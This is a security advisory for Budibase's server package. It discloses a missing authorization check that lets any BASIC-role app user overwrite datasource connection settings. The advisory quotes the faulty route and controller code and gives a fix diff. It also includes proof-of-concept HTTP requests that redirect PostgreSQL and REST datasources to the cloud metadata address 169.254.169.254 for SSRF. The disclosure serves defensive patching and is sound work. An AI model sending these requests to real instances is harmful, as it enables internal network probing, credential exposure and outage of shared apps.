# [H] Budibase: `PUT /api/datasources/:datasourceId` is protected only by `TABLE/READ` permission instead of builder access, allowing any authenticated app user to overwrite datasource connection parameters including host, port, and URL

## Summary
Severity: High
Advisory: GHSA-44m2-crh7-f4q2
CVE: CVE-2026-45717
CWE: CWE-862
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-15
Source: https://github.com/advisories/GHSA-44m2-crh7-f4q2
Type: github-advisory

## Affected
- npm: `@budibase/server` — affected >=0 <3.38.1

## Details
## Summary

Budibase exposes a REST API for datasource management. The route `PUT /api/datasources/:datasourceId` is registered in the `authorizedRoutes` group with `TABLE/READ` permission. This is the same authorization level as the read endpoint (`GET /api/datasources/:datasourceId`). Every authenticated Budibase app user with the `BASIC` built-in role or higher carries `TABLE/WRITE` (and therefore `TABLE/READ`) permissions, and the datasource update controller performs no additional builder check.

As a result, any authenticated non-builder app user can submit a `PUT` request to rewrite a datasource's `config` object — including the connection `host`, `port`, database credentials, or the base `url` of a REST datasource. Because no network-level SSRF protection is applied to SQL driver connections, redirecting a PostgreSQL/MySQL/MongoDB datasource to an internal IP address succeeds and the attacker can probe or interact with internal services on arbitrary ports.

## Code evidence

### Route registration — wrong authorization group

```
packages/server/src/api/routes/datasource.ts, line 35-37
```

```typescript
authorizedRoutes
  .get("/api/datasources/:datasourceId", datasourceController.find)
  .put("/api/datasources/:datasourceId", datasourceController.update)   // <-- should be builderRoutes
```

All destructive (create/delete/verify) operations are gated behind `builderRoutes`:

```typescript
builderRoutes
  .get("/api/datasources", datasourceController.fetch)
  .post("/api/datasources/verify", datasourceController.verify)
  .post("/api/datasources", datasourceValidator(), datasourceController.save)
  .delete("/api/datasources/:datasourceId/:revId", datasourceController.destroy)
```

The `update` route shares the same authorization group as the read route, not the builder group.

### Authorization middleware allows BASIC-role users

```
packages/server/src/middleware/authorized.ts, lines 46-50
packages/backend-core/src/security/permissions.ts, lines 82-90
packages/backend-core/src/security/roles.ts, lines 162-169
```

`authorizedRoutes` is defined with `authorized(PermissionType.TABLE, PermissionLevel.READ)`.

When `doesHaveBasePermission(TABLE, READ, rolesHierarchy)` is evaluated for a BASIC-role user:

- `BASIC` role → `BuiltinPermissionID.WRITE`
- `WRITE` permission includes `PermissionImpl(PermissionType.TABLE, PermissionLevel.WRITE)`
- `getAllowedLevels(WRITE)` returns `[WRITE, READ]`
- Therefore `TABLE/READ` is satisfied → user is authorized

BASIC is the lowest non-public authenticated built-in role. Any end-user account added to a Budibase app will be assigned at minimum the BASIC role.

### Controller performs no additional builder check

```
packages/server/src/api/controllers/datasource.ts, lines 207-255
```

```typescript
export async function update(ctx) {
  const db = context.getWorkspaceDB()
  const datasourceId = ctx.params.datasourceId
  const baseDatasource = await sdk.datasources.get(datasourceId)  // no builder guard
  await invalidateVariables(baseDatasource, ctx.request.body)

  const dataSourceBody: Datasource = isBudibaseSource
    ? { name: ..., type: ..., source: SourceName.BUDIBASE }
    : ctx.request.body                                              // attacker-controlled config

  let datasource: Datasource = {
    ...baseDatasource,
    ...sdk.datasources.mergeConfigs(dataSourceBody, baseDatasource),  // merges attacker config
  }

  const response = await db.put(sdk.tables.populateExternalTableSchemas(datasource))  // persisted
  ...
}
```

### mergeConfigs does not protect non-password connection fields

```
packages/server/src/sdk/workspace/datasources/datasources.ts, lines 278-316
```

`mergeConfigs` only replaces `PASSWORD_REPLACEMENT` sentinel values back to the stored secret. Fields like `host`, `port`, `database`, `url`, `ssl` are taken from the update payload without restriction:

```typescript
// update back to actual passwords for everything else
for (let [key, value] of Object.entries(update.config)) {
  if (value !== PASSWORD_REPLACEMENT) {
    continue          // non-password fields pass through unchanged
  }
  ...
}
```

## Attack scenarios

### Scenario 1: SSRF via SQL driver connection redirection

1. Attacker is a BASIC-role user of a Budibase app that has a PostgreSQL (or MySQL/MongoDB) datasource.
2. Attacker sends:
   ```http
   PUT /api/datasources/<datasource_id> HTTP/1.1
   Host: target
   Authorization: Bearer <app-user-token>
   Content-Type: application/json

   {
     "config": {
       "host": "169.254.169.254",
       "port": 5432,
       "database": "postgres",
       "user": "postgres",
       "password": "PASSWORD_REPLACEMENT"
     }
   }
   ```
3. Datasource config is persisted with `host: 169.254.169.254`.
4. Any subsequent query execution against this datasource (`POST /api/queries/execute`) causes Budibase's PostgreSQL driver to open a TCP connection to `169.254.169.254:5432` on the internal network.
5. Unlike REST connector SSRF (which has an IP deny list), SQL driver connections are made at the OS network level without HTTP-layer filtering, bypassing the existing SSRF mitigation introduced for REST connectors.

### Scenario 2: SSRF via REST datasource URL change

1. Same setup with a REST datasource.
2. Attacker sends:
   ```http
   PUT /api/datasources/<datasource_id> HTTP/1.1
   ...
   {
     "config": {
       "url": "http://169.254.169.254/latest/meta-data/"
     }
   }
   ```
3. If the `IMPORT_IP_DENY_LIST` equivalent for Budibase's REST connector is not configured, the fetch proceeds and the response is visible in query results.
4. Even with IP restrictions on the REST connector, the attacker can point the URL to any public-facing internal service (e.g., a staging server, internal API).

### Scenario 3: Datasource disruption / DoS

An attacker with BASIC permissions can overwrite the datasource config with garbage values, breaking all application queries that depend on that datasource for all users of the app.

## Minimal PoC shape

```http
PUT /api/datasources/<target_datasource_id> HTTP/1.1
Host: <budibase-host>
Authorization: Bearer <basic-user-access-token>
Content-Type: application/json

{
  "name": "Modified",
  "source": "POSTGRES",
  "type": "datasource",
  "config": {
    "host": "169.254.169.254",
    "port": 5432,
    "database": "postgres",
    "user": "postgres",
    "password": "PASSWORD_REPLACEMENT",
    "ssl": false
  }
}
```

Expected secure behavior:
- Return `403 Forbidden` — only builder/admin users should be allowed to update datasource configurations.

Observed source behavior:
- Config is persisted to CouchDB and all future queries against the datasource use the attacker-supplied connection parameters.

## Impact

| Dimension | Assessment |
|---|---|
| Privileges required | Authenticated BASIC-role app user (lowest non-public role) |
| User interaction | None |
| Confidentiality | High — SSRF to cloud metadata or internal services |
| Integrity | High — overwrites datasource used by all app users |
| Availability | High — can break all queries by injecting invalid config |

Initial severity estimate: **High (CVSS ~8.1)**

## Why this is distinct from known CVEs

| CVE / GHSA | Root cause | Different because |
|---|---|---|
| CVE-2026-31818 (SSRF in REST connector) | `IMPORT_IP_DENY_LIST` not set by default | That fixed HTTP-level filter; SQL driver connections bypass HTTP-layer protection entirely |
| GHSA-2g39-332f-68p9 (RBAC privilege escalation) | Creator role could create Admin roles | Different mechanism — role creation, not route auth bypass |
| GHSA-gw94-hprh-4wj8 (Universal auth bypass) | `?/webhooks/trigger` param bypassed auth | Completely different attack primitive |
| GHSA-726g-59wr-cj4c (PostgreSQL dump command injection) | Unsanitized connection params in backup path | Different vector — this is write access to live connection config |

The root cause here is a **route-level authorization misconfiguration**: `PUT /api/datasources/:id` is registered in the wrong endpoint group (`authorizedRoutes` vs `builderRoutes`).

## Fix direction

Move the `PUT /api/datasources/:datasourceId` route from `authorizedRoutes` to `builderRoutes`:

```diff
- authorizedRoutes
-   .get("/api/datasources/:datasourceId", datasourceController.find)
-   .put("/api/datasources/:datasourceId", datasourceController.update)

+ authorizedRoutes
+   .get("/api/datasources/:datasourceId", datasourceController.find)

+ builderRoutes
+   .put("/api/datasources/:datasourceId", datasourceController.update)
```

## Submission note

Current state: source-confirmed candidate.
Runtime reproduction (HTTP request against live Budibase instance) has not been executed in this session.
Budibase has an active GHSA process — security reports via GitHub Security Advisories should receive triage within days based on historical pattern.

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-44m2-crh7-f4q2
- https://nvd.nist.gov/vuln/detail/CVE-2026-45717
- https://github.com/Budibase/budibase
- https://github.com/Budibase/budibase/releases/tag/3.38.1
